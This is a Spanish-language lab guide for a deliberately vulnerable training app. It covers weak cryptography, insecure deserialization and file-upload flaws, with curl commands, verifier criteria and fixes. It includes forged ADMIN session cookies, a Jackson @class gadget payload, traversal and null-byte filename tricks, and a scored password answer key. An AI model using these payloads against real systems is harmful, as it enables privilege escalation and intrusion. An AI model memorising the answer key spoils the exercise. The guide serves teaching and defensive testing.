Objetivo puntuable: resolver el reto actual y enviar password correcta. Abrir el reto o enviar VA_LAB_WRONG no entrega puntos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El seeder fija level10Secret=aa123456 y cifra el propio secreto con getKeyFromPassword(level10Secret). El verificador vuelve a cifrar cada conjetura usando esa misma conjetura como clave derivada; esto hace trivial probar el valor conocido y demuestra un diseño reversible con clave débil/predecible.

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_10 -H 'Accept: application/json' --data-urlencode 'password=aa123456'
```

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_10 -H 'Accept: application/json' --data-urlencode 'password=VA_LAB_WRONG'
```

Para el control positivo exige tanto /isValid=true como el mensaje de content que nombra aa123456; HTTP 200 por sí solo no es suficiente.

Registrar la misma prueba con el cliente del laboratorio:
lab request cryptographicFailures-10 --method GET --param password=aa123456 --header Accept=application/json

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

aa123456 es el único secreto de esta familia fijado literalmente en el seeder inspeccionado.

La lección es implementación de clave y almacenamiento reversible, no que AES-128 sea intrínsecamente débil.

**Corrección recomendada:** No cifrar contraseñas: usar un KDF adaptativo. Para otros secretos recuperables, usar claves aleatorias independientes del plaintext, AEAD, almacenamiento de claves separado y parámetros/nonce gestionados de forma segura.

### cryptographicFailures-11 · LEVEL_11 — control seguro BCrypt y semántica especial de isValid

Sin password la variante segura debe devolver el mensaje SECURE CHALLENGE, un hash BCrypt y isValid=true como indicador de configuración segura; con VA_LAB_WRONG debe devolver isValid=false e indicar el coste de trabajo. No se debe interpretar el primer true como contraseña aceptada.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

La ruta declara variant=SECURE y el hash se genera con BCrypt, salt y work factor. El valor de la contraseña es aleatorio de 15 caracteres, por lo que el positivo no es reproducible a partir del código sin una observación autorizada del seed; el control de fallo sí es inocuo.

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_11 -H 'Accept: application/json'
```

```bash
curl -i --get http://target:9090/VulnerableApp/CryptographicFailures/LEVEL_11 -H 'Accept: application/json' --data-urlencode 'password=VA_LAB_WRONG'
```

Verifica que la primera respuesta contiene SECURE CHALLENGE y que la segunda tiene /isValid=false. No otorgues crédito solo por hacer clic en la UI, observar un retraso o ver un 200; inspecciona la semántica JSON.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Analizar el control BCrypt seguro; leer el reto no es resolverlo."
}
```

**Pistas:**

El test de controlador inspeccionado no cubre LEVEL_11; esta verificación se basa en la anotación variant=SECURE y en el seeder/código del handler.

El work factor hace cada intento más costoso, pero este ejercicio no mide tiempos ni debe generar muchas solicitudes.

**Corrección recomendada:** Mantener un KDF adaptativo como BCrypt/Argon2id, calibrar el factor según el entorno, usar salt por hash y rehash cuando suban los parámetros. No revelar el hash a clientes en producción aunque el reto lo haga deliberadamente.

### Límites de esta familia

Informe estático del commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a; no se ejecutaron llamadas contra target, mailpit ni receiver y por tanto no se afirma que ningún ejercicio haya funcionado en el despliegue actual. Los niveles 1-4 y 11, y la contraseña aleatoria de level 1-4/11, dependen de la semilla en tiempo de arranque; los niveles 5-9 eligen aleatoriamente una candidata de COMMON_PASSWORDS; solo level 10 fija aa123456 en el código. Los tests inspeccionados cubren explícitamente level 1 y 5-9, pero no contienen pruebas de controlador para 2-4, 10 u 11. Los valores `isValid` y `content` son el contrato del bean: en LEVEL_11 el true inicial significa variante segura, no autenticación válida. Un reflejo de texto, un hash visible, un retraso, un clic en la UI o un status 200 no prueba por sí solo una vulnerabilidad ni una explotación; el verificador sugerido debe contrastar el JSON con la ruta, el parámetro y el comportamiento del código. No se incluyen payloads de CommandInjection, XXE, path traversal, SSRF/RFI ni XSS porque no pertenecen a esta familia; en consecuencia no se contactan servicios externos, no se leen secretos del host, no se ejecutan comandos sobre el target y no se realizan acciones destructivas o de denegación de servicio.

## Deserialización insegura

La familia reconstruye objetos Java desde cookies controladas por el cliente. En LEVEL_1 y LEVEL_2 el valor es Base64 de JSON sin firma y se deserializa a UserPreferences, por lo que el cliente puede cambiar campos que la aplicación trata como confiables. LEVEL_3 es el control seguro: firma el JSON con HMAC-SHA256 y verifica la firma antes de parsear, además de enlazar el resultado a UserPreferences. LEVEL_4 activa el tipado polimórfico de Jackson con LaissezFaireSubTypeValidator: el JSON puede escoger la clase mediante @class y Jackson llama sus setters durante la lectura. El gadget incluido en el laboratorio solo agrega note a una lista de auditoría acotada en memoria; no se debe convertir este ejercicio en ejecución de comandos.

### Todos los niveles originales

#### `GET para comprobar; POST sobre la misma ruta para emitir la cookie normal /VulnerableApp/InsecureDeserialization/LEVEL_1`

**Entrada:** {
  "GET": {
    "cookies": {
      "preferences_level1": "Base64 de JSON UserPreferences, sin firma; campos observados: theme y notificationsEnabled"
    }
  },
  "POST": {
    "form": {
      "theme": "light o dark (obligatorio)",
      "notificationsEnabled": "true o false (opcional, default false)"
    },
    "response_cookie": "preferences_level1; HttpOnly; Path=/; Max-Age=3600"
  }
}

Si falta la cookie, el endpoint pide guardar preferencias. Si existe, deserializeUnsafe la decodifica y la reconstruye como UserPreferences sin comprobar firma, origen ni que el objeto provenga del POST legítimo. Devuelve isValid=true cuando theme no es light ni dark; el mensaje incluye el valor deserializado y el estado de notificaciones.

La validación del formulario POST solo limita lo que la interfaz escribe; no protege el GET frente a una cookie editada. El payload del recurso de mensajes es preferences_level1=eyJ0aGVtZSI6IkhBQ0tFRCIsIm5vdGlmaWNhdGlvbnNFbmFibGVkIjp0cnVlfQ==, que decodifica a {"theme":"HACKED","notificationsEnabled":true}. Es manipulación de datos/objeto, no ejecución de código.

#### `GET para comprobar; POST sin cuerpo para emitir la sesión normal /VulnerableApp/InsecureDeserialization/LEVEL_2`

**Entrada:** {
  "GET": {
    "cookies": {
      "session_level2": "Base64 de JSON UserPreferences con username y role, sin firma"
    }
  },
  "POST": {
    "form": {},
    "response_cookie": "session_level2; HttpOnly; Path=/; Max-Age=3600; normalmente username=Adam y role=USER"
  }
}

La cookie emitida por startSessionLevel2 representa a Adam como USER. El GET deserializa la cookie sin firma y usa session.getRole() para decidir si muestra las tareas administrativas. Un JSON que cambie role a ADMIN recibe isValid=true y el texto Welcome Adam (ADMIN) con Admin tasks.

Es una escalada de privilegios didáctica causada por confiar en un campo de autorización dentro de un objeto que controla el cliente. Un JSON vacío se trata como guest/USER y un role desconocido produce fallo de deserialización; ninguno de esos controles corrige la ausencia de integridad. El payload documentado es session_level2=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiQURNSU4ifQ==, que decodifica a {"username":"Adam","role":"ADMIN"}.

#### `GET para comprobar; POST sin cuerpo para emitir la sesión firmada /VulnerableApp/InsecureDeserialization/LEVEL_3`

**Entrada:** {
  "GET": {
    "cookies": {
      "session_level3": "Base64(JSON).Base64(HMAC-SHA256); la firma solo la conoce el servidor"
    }
  },
  "POST": {
    "form": {},
    "response_cookie": "session_level3; HttpOnly; Path=/; Max-Age=3600; sesión de Adam como USER y firma HMAC"
  }
}

verifyAndDeserialize rechaza null, entradas mayores de 16.384 caracteres, valores sin punto separador, Base64 inválido y firmas ausentes o distintas. Compara la firma antes de entregar los bytes a Jackson y luego enlaza el resultado a UserPreferences. La cookie genuina se acepta; la cookie unsigned ADMIN de LEVEL_2 o una cookie firmada cuyo primer componente fue cambiado se rechazan.

Es el control negativo/positivo seguro incluido en la familia, marcado variant=SECURE. El secreto se genera aleatoriamente al arrancar la JVM, por lo que no es reproducible calcular una firma válida desde Kali; la forma segura de obtener una cookie es el POST de emisión. La anotación sigue declarando la categoría INSECURE_DESERIALIZATION para que el nivel aparezca en el catálogo, pero la implementación está diseñada para no ser explotable por manipulación del cliente.

#### `GET para comprobar; POST con section para emitir una visita normal /VulnerableApp/InsecureDeserialization/LEVEL_4`

**Entrada:** {
  "GET": {
    "cookies": {
      "activity_level4": "Base64 de JSON polimórfico; @class nombra la clase a instanciar"
    }
  },
  "POST": {
    "form": {
      "section": "texto de la sección, por ejemplo Level 2"
    },
    "response_cookie": "activity_level4; HttpOnly; Path=/; Max-Age=3600"
  }
}

deserializePolymorphicUnsafe usa un ObjectMapper con default typing y LaissezFaireSubTypeValidator. Un cookie normal nombra VisitedSection y el endpoint devuelve Last visited section. Si el JSON nombra org.sasanlabs.service.vulnerability.deserialization.AuditLogGadget, Jackson instancia esa clase y llama setNote durante la lectura; el endpoint devuelve Audit log: <note> con isValid=true. Otros tipos de la clase permitida producen unexpected type.

La clase AuditLogGadget es un gadget de laboratorio seguro: solo añade el note a una lista CopyOnWriteArrayList limitada a 50 entradas. El código no debe interpretarse como una invitación a probar shells, lectura de archivos, redirecciones ni comandos. El payload benigno documentado es activity_level4=eyJAY2xhc3MiOiJvcmcuc2FzYW5sYWJzLnNlcnZpY2UudnVsbmVyYWJpbGl0eS5kZXNlcmlhbGl6YXRpb24uQXVkaXRMb2dHYWRnZXQiLCJub3RlIjoiSEFDS0VEIn0=, que el test de la familia usa para observar test-marker/HACKED en la auditoría.

### deserialization-01 · LEVEL_1: alterar un objeto de preferencias sin firma

La preparación normal devuelve 200 y Set-Cookie. Con la cookie controlada, el GET debería devolver un JSON cuyo isValid sea true y cuyo content refleje Theme: HACKED, notifications on, si el despliegue coincide con el código revisado. El control negativo con la cookie emitida para dark debería conservar isValid=false.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El formulario permite solo light/dark, pero el GET confía en cualquier Base64(JSON) recibido. La cadena HACKED se usa únicamente como marcador de estado; no contiene HTML activo ni orden de sistema. El check JSON comprueba la señal explícita del bean, mientras que content=Theme: HACKED es evidencia contextual que conviene inspeccionar por separado.

1. Control negativo: emitir una cookie legítima y observar solo la cabecera sin asumir que el reto está resuelto: curl -i -c /tmp/va-deser-l1.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_1' -H 'Content-Type: application/x-www-form-urlencoded' --data 'theme=dark&notificationsEnabled=true'

2. Comprobar la cookie legítima: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_1' -b /tmp/va-deser-l1.cookies -H 'Accept: application/json'

3. Control positivo seguro, sin ejecutar nada en el servidor: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_1' -H 'Accept: application/json' -H 'Cookie: preferences_level1=eyJ0aGVtZSI6IkhBQ0tFRCIsIm5vdGlmaWNhdGlvbnNFbmFibGVkIjp0cnVlfQ=='

4. Comparar ambos JSON. Una respuesta 200 solo demuestra que el endpoint respondió; el resultado esperado de este código se acredita por $.isValid=true y el contenido HACKED, no por el código HTTP aislado.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "true"
}
```

**Pistas:**

La cookie es Base64, no cifrado: el valor se puede decodificar conceptualmente como {"theme":"HACKED","notificationsEnabled":true}.

No hace falta usar un navegador ni ejecutar un comando del sistema; basta con enviar la cabecera Cookie.

Compara contra la cookie legítima de dark para no confundir una respuesta normal con la señal del ejercicio.

**Corrección recomendada:** No usar un objeto serializado controlado por el cliente para una decisión de negocio. Preferir estado del lado servidor o un token firmado con HMAC verificado antes de parsear; enlazar el resultado a un esquema/clase permitido, validar tamaño y campos, y mantener una lista de valores de negocio válida después de verificar integridad.

### deserialization-02 · LEVEL_2: contrastar USER con una sesión ADMIN forjada

El POST de control emite Adam/USER. El GET con esa cookie debe mostrar Welcome Adam (USER) y isValid=false. El GET con el Base64 ADMIN de este ejercicio debería mostrar Welcome Adam (ADMIN), Admin tasks e isValid=true, según la lógica revisada.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El mismo tipo UserPreferences contiene role, y el código usa ese valor directamente para decidir tareas administrativas. La comparación USER/ADMIN hace visible la diferencia de autorización. La comprobación contains es intencionalmente complementaria: se debe revisar también que el JSON tenga isValid=true; encontrar texto no prueba por sí solo que una autorización real se haya bypassed en otro contexto.

1. Iniciar la sesión normal en un jar local: curl -i -c /tmp/va-deser-l2.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_2' -H 'Accept: application/json'

2. Control negativo USER: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_2' -b /tmp/va-deser-l2.cookies -H 'Accept: application/json'

3. Control positivo seguro con el marcador documentado y sin comandos externos: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_2' -H 'Accept: application/json' -H 'Cookie: session_level2=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiQURNSU4ifQ=='

4. Confirmar la diferencia en content y $.isValid. No atribuir el resultado a un 200: ambos caminos están diseñados para responder HTTP 200 y expresar el estado en el JSON.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Welcome Adam (ADMIN)"
}
```

**Pistas:**

El cookie legítimo representa role=USER; el payload positivo solo cambia ese campo a ADMIN.

No hay que adivinar ni romper una firma en LEVEL_2: el código no verifica ninguna.

El control USER evita llamar éxito a cualquier respuesta que simplemente contenga un saludo.

**Corrección recomendada:** No aceptar role/subject desde un cookie unsigned. Mantener la identidad y los permisos en una sesión del servidor o en un token con firma, validar issuer/audience/expiración y aplicar autorización server-side en cada operación; no derivar privilegios solo de un objeto reconstruido desde bytes del cliente.

### deserialization-03 · LEVEL_3: verificar que HMAC rechaza el mismo cambio ADMIN

La cookie genuina emitida por POST se acepta como Adam/USER. El mismo payload ADMIN unsigned usado contra LEVEL_2 debe ser rechazado en LEVEL_3, normalmente con isValid=false y un mensaje sobre firma ausente o mismatch. No se intenta fabricar una HMAC desde Kali.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Este nivel es el control seguro de la familia. El check solo evita confundir una respuesta con privilegios ADMIN con una aceptación segura; la prueba más fuerte es comparar la cookie genuina con la unsigned y, si se modifica una cookie firmada real, observar Signature mismatch. El secreto es aleatorio por proceso, por lo que no se debe presentar una firma calculada manualmente ni prometer un valor estable.

1. Obtener una cookie firmada legítima y guardar el Set-Cookie localmente: curl -i -c /tmp/va-deser-l3.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_3' -H 'Accept: application/json'

2. Control positivo del camino seguro: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_3' -b /tmp/va-deser-l3.cookies -H 'Accept: application/json'

3. Reusar deliberadamente el payload ADMIN sin firma, que sí se acepta en LEVEL_2: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_3' -H 'Accept: application/json' -H 'Cookie: session_level3=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiQURNSU4ifQ=='

4. Registrar como resultado esperado el rechazo de ADMIN, no el mero 200. Si se prueba una mutación de una cookie genuina, conservar el componente después del punto y cambiar solo el Base64 anterior; el código debería informar Signature mismatch.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Welcome Adam (ADMIN)"
}
```

**Pistas:**

La cookie de LEVEL_3 tiene dos componentes separados por un punto; la de LEVEL_2 solo tiene Base64(JSON).

El HMAC se verifica antes de que Jackson lea el JSON, así que cambiar role no debe llegar a la decisión de autorización.

La emisión de la cookie genuina y su aceptación son el control positivo; la cookie unsigned ADMIN es el control negativo de seguridad.

**Corrección recomendada:** Conservar la verificación HMAC antes de la deserialización, usar comparación resistente a timing, limitar tamaño y enlazar el payload a la clase esperada. En una aplicación real, preferir además sesión server-side para roles y rotación/gestión segura del secreto; no exponerlo en el cliente.

### deserialization-04 · LEVEL_4: instanciación de un gadget de auditoría benigno

La cookie normal debe producir Last visited section: Level 2 e isValid=false. La cookie positiva nombra AuditLogGadget, por lo que debería producir Audit log: HACKED e isValid=true y dejar un marcador en la lista de auditoría del proceso, si el despliegue coincide con el commit. Esto solo demuestra que el setter se ejecutó durante deserialización; no demuestra RCE ni acceso a red.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El campo @class no es un dato de VisitedSection validado: decide qué clase construye el ObjectMapper polimórfico. AuditLogGadget.setNote escribe el marcador en memoria antes de que el controlador inspeccione el objeto. El valor HACKED es texto benigno. El check de contenido es una señal observable del gadget de laboratorio, pero el verificador honesto debe indicar que un texto reflejado o un HTTP 200 no acredita ejecución arbitraria.

1. Emitir primero una visita normal, guardando su cookie: curl -i -c /tmp/va-deser-l4.cookies -X POST 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_4' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'section=Level 2'

2. Control negativo con VisitedSection normal: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_4' -b /tmp/va-deser-l4.cookies -H 'Accept: application/json'

3. Control positivo seguro, limitado a un marcador de auditoría en memoria: curl -i --get 'http://target:9090/VulnerableApp/InsecureDeserialization/LEVEL_4' -H 'Accept: application/json' -H 'Cookie: activity_level4=eyJAY2xhc3MiOiJvcmcuc2FzYW5sYWJzLnNlcnZpY2UudnVsbmVyYWJpbGl0eS5kZXNlcmlhbGl6YXRpb24uQXVkaXRMb2dHYWRnZXQiLCJub3RlIjoiSEFDS0VEIn0='

4. Comparar el texto Audit log: HACKED con Last visited section. No usar @class de ninguna otra clase, no enviar payloads de procesos/red/archivos y no convertir el marcador en una orden ejecutable.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Audit log: HACKED"
}
```

**Pistas:**

El JSON positivo contiene exactamente @class=org.sasanlabs.service.vulnerability.deserialization.AuditLogGadget y note=HACKED.

La cookie normal sirve como control negativo porque nombra VisitedSection y no AuditLogGadget.

El efecto observable está acotado a la lista de auditoría en memoria, que el test limita a 50 entradas.

**Corrección recomendada:** No habilitar default typing para input no confiable. Desactivar polimorfismo por defecto, usar DTOs concretos y allowlists estrictas de tipos cuando sean imprescindibles, verificar integridad antes de parsear, validar tamaño y aislar cualquier gadget/sink; actualizar dependencias y revisar clases con setters/constructores con efectos secundarios.

### Límites de esta familia

[
  "El informe es una verificación estática del commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a. No se afirma que los comandos hayan sido ejecutados con éxito contra target:9090 en esta revisión ni que el contenedor esté en un estado concreto.",
  "El resultado esperado depende de que el despliegue use el perfil public, el context-path /VulnerableApp, el puerto 9090 y exactamente el código revisado. La cookie de LEVEL_3 es emitida por el proceso y su HMAC no puede reproducirse offline desde Kali.",
  "Los niveles GET y sus controladores de emisión POST comparten cada ruta. Un Set-Cookie confirma que se emitió una cookie; no confirma que la deserialización posterior sea segura ni que el desafío esté resuelto.",
  "Los checks propuestos son señales verificables, no un sistema de puntuación. Un HTTP 200 no prueba IDOR, autorización correcta, deserialización segura ni ejecución de código. Un texto reflejado no prueba ejecución XSS; aquí no se usa ningún payload XSS. No se debe atribuir puntaje por hacer clic en la interfaz.",
  "En LEVEL_4, ver Audit log: HACKED o comprobar que un setter recibió note solo evidencia instanciación y efecto del gadget incluido. No demuestra RCE, ejecución remota, lectura de secretos ni acceso a servicios. Se excluyen expresamente comandos externos, reverse shells, archivos del host, DoS y borrado de datos.",
  "El campo check.kind=contains o not_contains no sustituye la inspección del JSON completo; check.kind=json con $.isValid depende de la forma de respuesta del bean y solo comprueba ese campo. check.kind=header, si se usa para Set-Cookie, solo demuestra una cabecera. Para una conclusión fuerte deben compararse siempre el control negativo y el positivo y anotarse también los mensajes de error.",
  "No hay un recurso src/main/resources/attackvectors específico de esta familia en el commit; los valores de payload y las explicaciones están en src/main/resources/i18n/messages.properties y en las anotaciones ChallengeCard de InsecureDeserializationVulnerability."
]

## Carga de archivos y validadores

La familia está implementada por UnrestrictedFileUpload bajo el perfil unsafe. La anotación de clase @VulnerableAppRestController(value = UnrestrictedFileUpload) aporta el nombre del controlador y cada @VulnerableAppRequestMapping(value = LEVEL_n, requestMethod = POST) aporta el nivel; por eso las rutas de laboratorio son /VulnerableApp/UnrestrictedFileUpload/LEVEL_1 hasta /VulnerableApp/UnrestrictedFileUpload/LEVEL_12. Todos reciben un MultipartFile obligatorio en el campo multipart file. Los niveles 1 a 9 son las variantes originales no seguras: progresan desde guardar el nombre original sin validación hasta filtros de extensión, una variante de byte nulo, path traversal en un directorio separado y ausencia de límite de tamaño. Los niveles 10 a 12 están marcados Variant.SECURE; el 10 comprueba únicamente el sufijo, el 11 comprueba una firma PNG/JPEG y genera un nombre UUID y el 12 añade un máximo propio de 512 KiB. Las cargas basadas en root se sirven mediante /VulnerableApp/upload/**, registrado por UnrestrictedFileUploadWebConfiguration. LEVEL_8 usa contentDispositionUpload y su respuesta se puede intentar descargar mediante el PreflightController en /VulnerableApp/contentDispositionUpload/{fileName}; ese controlador normaliza y exige que el resultado permanezca bajo la raíz antes de leerlo. Este documento es una verificación estática del commit solicitado y diseña comandos seguros para el laboratorio; no afirma que las solicitudes se hayan ejecutado con éxito contra target.

### Todos los niveles originales

#### `POST /VulnerableApp/UnrestrictedFileUpload/LEVEL_1`

**Entrada:** {
  "file": "MultipartFile obligatorio; se conserva exactamente file.getOriginalFilename() y el contenido se copia al root de uploads"
}

Acepta cualquier nombre y cualquier contenido, guarda con el nombre original y devuelve {content: /VulnerableApp/upload/{fileName}, isValid: true}. La ubicación también queda reflejada en la respuesta y el recurso /upload/** se sirve desde el directorio temporal compartido.

La anotación declara unrestricted file upload, persistent XSS, reflected XSS y path traversal. Un nombre como ../... puede escapar del root porque genericFileUploadUtility hace root.resolve(fileName) sin normalizar ni comprobar contención. Un HTML benigno se usa en el ejercicio, pero que el contenido se sirva o que una página lo ejecute debe verificarse por separado; ni un 200 ni el reflejo de la URL prueban ejecución XSS.

#### `POST /VulnerableApp/UnrestrictedFileUpload/LEVEL_2`

**Entrada:** {
  "file": "MultipartFile obligatorio; el nombre efectivo es RANDOM.nextInt() + _ + nombre original"
}

Acepta cualquier contenido y extensión, pero antepone un entero pseudoaleatorio al nombre antes de guardar en root y de construir content.

La anotación conserva unrestricted file upload, persistent XSS y reflected XSS, pero no path traversal. El prefijo cambia la URL y hace impredecible el nombre; la validación de extensión sigue ausente. La prueba unitaria sólo exige que aparezca algún archivo.

#### `POST /VulnerableApp/UnrestrictedFileUpload/LEVEL_3`

**Entrada:** {
  "file": "MultipartFile obligatorio; se rechaza si el nombre termina exactamente en .html con sensibilidad a mayúsculas"
}

Si no coincide ^.+\.html$ acepta, antepone RANDOM.nextInt() + _ y guarda en root; si coincide devuelve content=Input is invalid e isValid=false con HTTP 200.

La extensión .htm todavía pasa porque sólo se excluye .html. La validación mira el nombre del cliente, no los bytes ni el tipo MIME. El test de código demuestra que attack.html es rechazado; no demuestra un navegador ni una explotación remota.

#### `POST /VulnerableApp/UnrestrictedFileUpload/LEVEL_4`

**Entrada:** {
  "file": "MultipartFile obligatorio; se rechazan sufijos .html y .htm con sensibilidad a mayúsculas"
}

Usa ^.+\.(html|htm)$ sin lower-case. Un nombre que no coincida se guarda con prefijo aleatorio en root y devuelve isValid=true; los nombres coincidentes devuelven isValid=false y HTTP 200.

La propia descripción de ataque señala el bypass mediante .HTML. La variante sólo filtra dos sufijos exactos y no valida el contenido.

#### `POST /VulnerableApp/UnrestrictedFileUpload/LEVEL_5`

**Entrada:** {
  "file": "MultipartFile obligatorio; el nombre se pasa a lower-case antes de comprobar .html o .htm"
}

Rechaza case-insensitivamente nombres terminados en .html o .htm; los demás se guardan en root con prefijo aleatorio y la respuesta isValid=true.

La prueba con attack.HTM es negativa. El payload histórico propone .xhtml: por la expresión completa ^.+\.(html|htm)$, .xhtml no termina en una de esas extensiones y queda aceptado. La comprobación sigue basada sólo en nombre y no en bytes.

#### `POST /VulnerableApp/UnrestrictedFileUpload/LEVEL_6`

**Entrada:** {
  "file": "MultipartFile obligatorio; el nombre debe hacer match por find con ^.+\\.(png|jpeg), sin anclar el final"
}

Acepta si en el comienzo del nombre aparece un segmento .png o .jpeg, incluso si después hay más texto como .html; guarda con prefijo aleatorio en root. La expresión real no convierte a lower-case y por tanto no es case-insensitive aunque la descripción de la anotación lo diga.

El test usa malicious.png.html con bytes de texto y espera true. Este nivel es un ejemplo claro de control por substring: una extensión permitida intermedia no implica que el recurso sea realmente una imagen.

#### `POST /VulnerableApp/UnrestrictedFileUpload/LEVEL_7`

**Entrada:** {
  "file": "MultipartFile obligatorio; el validador comprueba el nombre original contra ^.+\\.(png|jpeg)$ y la ruta de almacenamiento usa el nombre truncado antes del primer byte NUL"
}

Si el nombre contiene el carácter NUL, originalFileName se corta antes de él para construir el nombre guardado, pero validator sigue comprobando el nombre original completo. Un nombre que termina en .png o .jpeg puede pasar y acabar guardado con el prefijo aleatorio más el tramo anterior al NUL.

El test Java usa shell.php + Constants.NULL_BYTE_CHARACTER + .png y observa un archivo cuyo nombre contiene shell.php y ya no termina en .png. Esa evidencia es de la llamada Java/MockMultipartFile; la posibilidad de transportar un NUL literal mediante un proxy, servlet y curl reales es incierta y no se debe inferir de una sola respuesta HTTP.

#### `POST /VulnerableApp/UnrestrictedFileUpload/LEVEL_8`

**Entrada:** {
  "file": "MultipartFile obligatorio; se usa el nombre original sin prefijo en contentDispositionRoot y se escapa HTML en content"
}

Acepta cualquier nombre y contenido en el directorio contentDispositionUpload. root.resolve(fileName) se copia sin normalize ni startsWith, por lo que un nombre relativo con .. puede escribir fuera de esa raíz. Devuelve la URL contentDispositionUpload y isValid=true.

Es el nivel de path traversal dedicado. El ejercicio sólo usa el destino autorizado /tmp/va-training.txt y el marcador VA_LAB_FILE. El PreflightController no convierte ese bypass de escritura en lectura arbitraria: normaliza y devuelve 404 si la ruta solicitada queda fuera de contentDispositionRoot.

#### `POST /VulnerableApp/UnrestrictedFileUpload/LEVEL_9`

**Entrada:** {
  "file": "MultipartFile obligatorio; cualquier extensión y tamaño que alcance el método; se agrega prefijo aleatorio y se escapa HTML en content"
}

Acepta y copia sin límite propio, guarda en root con prefijo aleatorio y responde HTTP 200 con isValid=true. VulnerableAppConfiguration instala para esta ruta un CommonsMultipartResolver con max upload y max per file en -1, evitando el límite multipart por defecto sólo en LEVEL_9.

La anotación declara uncontrolled resource consumption y denial of service además de path traversal. No se debe probar con archivos grandes en este informe: se usa únicamente un archivo pequeño. El comentario del código explica que la ausencia de límite es el objetivo; el test unitario sólo usa 1024 bytes.

#### `POST /VulnerableApp/UnrestrictedFileUpload/LEVEL_10`

**Entrada:** {
  "file": "MultipartFile obligatorio; el nombre debe terminar en .png o .jpeg exactamente, sensible a mayúsculas"
}

Está marcado Variant.SECURE, pero sólo valida el sufijo con ENDS_WITH_PNG_OR_JPEG_PATTERN; cualquier bytes se aceptan si el nombre termina en .png o .jpeg. Guarda con prefijo aleatorio en root y escapa HTML en content.

El comentario del código dice que la vulnerabilidad no parece explotable y la anotación lo marca secure, pero la implementación no inspecciona firma ni MIME: shell.php.png con bytes que no son imagen pasa. Esa limitación de validación de tipo debe quedar documentada; la clasificación secure no equivale a una validación completa.

#### `POST /VulnerableApp/UnrestrictedFileUpload/LEVEL_11`

**Entrada:** {
  "file": "MultipartFile obligatorio; los primeros bytes deben comenzar con la firma PNG o JPEG reconocida por detectImageExtension"
}

Lee el contenido, detecta PNG por 89 50 4E 47 0D 0A 1A 0A o JPEG por FF D8 FF, ignora el nombre enviado, genera UUID + .png/.jpeg y guarda en root. Un contenido sin firma devuelve isValid=false con HTTP 200.

Está marcado Variant.SECURE. Los tests prueban aceptación de una firma PNG mínima, rechazo de texto aunque el nombre sea .png y que ../../shell.html no llega al nombre almacenado. Es una comprobación de firma inicial, no un parser completo de imagen ni una garantía frente a todo archivo poliglota.

#### `POST /VulnerableApp/UnrestrictedFileUpload/LEVEL_12`

**Entrada:** {
  "file": "MultipartFile obligatorio; debe tener firma PNG/JPEG y content.length <= 512 * 1024 bytes"
}

Combina la firma y el nombre de servidor de LEVEL_11 con un límite de 512 KiB. Dentro del límite y con firma acepta; un JPEG de 512 KiB + 1 byte devuelve isValid=false. El multipart resolver predeterminado puede rechazar antes los cuerpos por encima de 1 MiB, antes de que la validación propia se ejecute.

Está marcado Variant.SECURE. El test directo demuestra rechazo sobre 512 KiB + 1, pero la ruta HTTP puede tener además los límites/configuración del resolver y del contenedor; no se propone generar cargas grandes en el laboratorio.

### fileupload-01 · LEVEL_1: carga y recuperación de HTML con marcador DOM benigno

La respuesta de POST debería describir, según el código, isValid=true y content=/VulnerableApp/upload/va-dom.html. Una solicitud GET posterior al recurso debería devolver el marcador textual. El GET no demuestra por sí solo que un navegador ejecutó el script.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Este ejercicio usa el flujo real del template: FormData.append("file", file), respuesta JSON con content e isValid y handler estático /upload/**. El marcador modifica sólo el DOM; no lee cookies, almacenamiento ni secretos. La diferencia entre contenido servido y ejecución debe observarse manualmente en un navegador de laboratorio si se desea estudiar XSS persistente; un reflejo, una cadena en el cuerpo o un HTTP 200 nunca son prueba suficiente de ejecución XSS.

printf '%s' '<html><body><script>document.body.dataset.vaLab="VA_LAB_DOM_OK"</script></body></html>' > /tmp/va-dom.html

```bash
curl -i -X POST http://target:9090/VulnerableApp/UnrestrictedFileUpload/LEVEL_1 -H 'Accept: application/json' -F 'file=@/tmp/va-dom.html;filename=va-dom.html;type=text/html'
```

```bash
curl -i http://target:9090/VulnerableApp/upload/va-dom.html
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "VA_LAB_DOM_OK"
}
```

**Pistas:**

El campo debe llamarse exactamente file; es un multipart, no un parámetro de query.

Si el GET contiene el marcador, eso verifica almacenamiento/servicio del bytes, no ejecución JavaScript; no atribuyas puntaje por hacer click en una página.

